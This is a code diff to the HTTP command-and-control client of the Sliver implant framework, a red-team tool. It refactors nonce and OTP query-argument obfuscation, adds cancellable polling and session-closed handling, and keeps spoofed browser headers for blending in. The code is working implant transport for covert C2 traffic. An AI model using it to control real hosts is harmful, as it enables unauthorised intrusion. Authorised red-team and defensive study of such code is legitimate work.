@@ -21,7 +21,12 @@ package httpclient
 // {{if .Config.HTTPc2Enabled}}
 
 import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
 	"bytes"
+	"context"
 	"crypto/tls"
 	"errors"
 	"fmt"
@@ -30,14 +35,10 @@ import (
 	insecureRand "math/rand"
 	"strings"
 
-	"sync"
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
-
 	"net"
 	"net/http"
 	"net/url"
+	"sync"
 	"time"
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
@@ -51,6 +52,11 @@ const (
 	userAgent         = "{{GenerateUserAgent}}"
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+)
+
+var (
+	ErrClosed               = errors.New("http session closed")
+	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
 )
 
 // HTTPStartSession - Attempts to start a session with a given address
@@ -81,6 +87,9 @@ type SliverHTTPClient struct {
 	ProxyURL   string
 	SessionCtx *cryptography.CipherContext
 	SessionID  string
+	pollCancel context.CancelFunc
+	pollMutex  *sync.Mutex
+	Closed     bool
 }
 
 // SessionInit - Initialize the session
@@ -104,6 +113,36 @@ func (s *SliverHTTPClient) SessionInit() error {
 	return nil
 }
 
+// NonceQueryArgument - Adds a nonce query argument to the URL
+func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
+	values := uri.Query()
+	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	argValue := fmt.Sprintf("%d", value)
+	for i := 0; i < insecureRand.Intn(3); i++ {
+		index := insecureRand.Intn(len(argValue))
+		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		argValue = argValue[:index] + char + argValue[index:]
+	}
+	values.Add(string(key), argValue)
+	uri.RawQuery = values.Encode()
+	return uri
+}
+
+// OTPQueryArgument - Adds an OTP query argument to the URL
+func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
+	values := uri.Query()
+	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	for i := 0; i < insecureRand.Intn(3); i++ {
+		index := insecureRand.Intn(len(value))
+		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		value = value[:index] + char + value[index:]
+	}
+	values.Add(string([]byte{key1, key2}), value)
+	uri.RawQuery = values.Encode()
+	return uri
+}
+
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
 	req.Header.Set("User-Agent", userAgent)
@@ -117,35 +156,31 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	return req
 }
 
-func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
-	values := uri.Query()
-	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	// {{if .Config.Debug}}
-	log.Printf("Encoder nonce %d", value)
-	// {{end}}
-	argValue := fmt.Sprintf("%d", value)
-	for i := 0; i < insecureRand.Intn(3); i++ {
-		index := insecureRand.Intn(len(argValue))
-		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
-		argValue = argValue[:index] + char + argValue[index:]
-	}
-	values.Add(string(key), argValue)
-	uri.RawQuery = values.Encode()
-	return uri
-}
-
-func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
-	values := uri.Query()
-	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	for i := 0; i < insecureRand.Intn(3); i++ {
-		index := insecureRand.Intn(len(value))
-		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
-		value = value[:index] + char + value[index:]
-	}
-	values.Add(string([]byte{key1, key2}), value)
-	uri.RawQuery = values.Encode()
-	return uri
+// Do - Wraps http.Client.Do with a context
+func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, error) {
+	ctx, cancel := context.WithCancel(req.Context())
+	s.pollCancel = cancel
+	defer func() {
+		s.pollMutex.Lock()
+		defer s.pollMutex.Unlock()
+		if s.pollCancel != nil {
+			s.pollCancel()
+		}
+		s.pollCancel = nil
+	}()
+	done := make(chan error)
+	var resp *http.Response
+	var err error
+	go func() {
+		resp, err = s.Client.Do(req.WithContext(ctx))
+		select {
+		case <-ctx.Done():
+			done <- ctx.Err()
+		default:
+			done <- err
+		}
+	}()
+	return resp, <-done
 }
 
 // We do our own POST here because the server doesn't have the
@@ -200,12 +235,11 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	return nil
 }
 
-var (
-	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
-)
-
 // ReadEnvelope - Perform an HTTP GET request
 func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
+	if s.Closed {
+		return nil, ErrClosed
+	}
 	if s.SessionID == "" {
 		return nil, errors.New("no session")
 	}
@@ -216,7 +250,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	resp, err := s.Client.Do(req)
+	resp, err := s.DoPoll(req)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] GET failed %v", err)
@@ -265,6 +299,9 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 
 // WriteEnvelope - Perform an HTTP POST request
 func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
+	if s.Closed {
+		return ErrClosed
+	}
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -294,6 +331,9 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 
 	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.Client.Do(req)
+	// {{if .Config.Debug}}
+	log.Printf("[http] POST request completed")
+	// {{end}}
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] request failed %v", err)
@@ -310,9 +350,23 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 }
 
 func (s *SliverHTTPClient) CloseSession() error {
+	if s.Closed {
+		return nil
+	}
 	if s.SessionID == "" {
 		return errors.New("no session")
 	}
+	s.Closed = true
+
+	// Cancel any pending poll request
+	s.pollMutex.Lock()
+	defer s.pollMutex.Unlock()
+	if s.pollCancel != nil {
+		s.pollCancel()
+	}
+	s.pollCancel = nil
+
+	// Tell server session is closed
 	uri := s.closeURL()
 	nonce, _ := encoders.RandomEncoder()
 	s.NonceQueryArgument(uri, nonce)
@@ -440,6 +494,8 @@ func httpClient(address string, timeout time.Duration, proxyConfig string) *Sliv
 			Timeout:   timeout,
 			Transport: transport,
 		},
+		pollMutex: &sync.Mutex{},
+		Closed:    false,
 	}
 	parseProxyConfig(client, transport, proxyConfig)
 	return client
@@ -460,6 +516,8 @@ func httpsClient(address string, timeout time.Duration, proxyConfig string) *Sli
 			Timeout:   timeout,
 			Transport: transport,
 		},
+		pollMutex: &sync.Mutex{},
+		Closed:    false,
 	}
 	parseProxyConfig(client, transport, proxyConfig)
 	return client
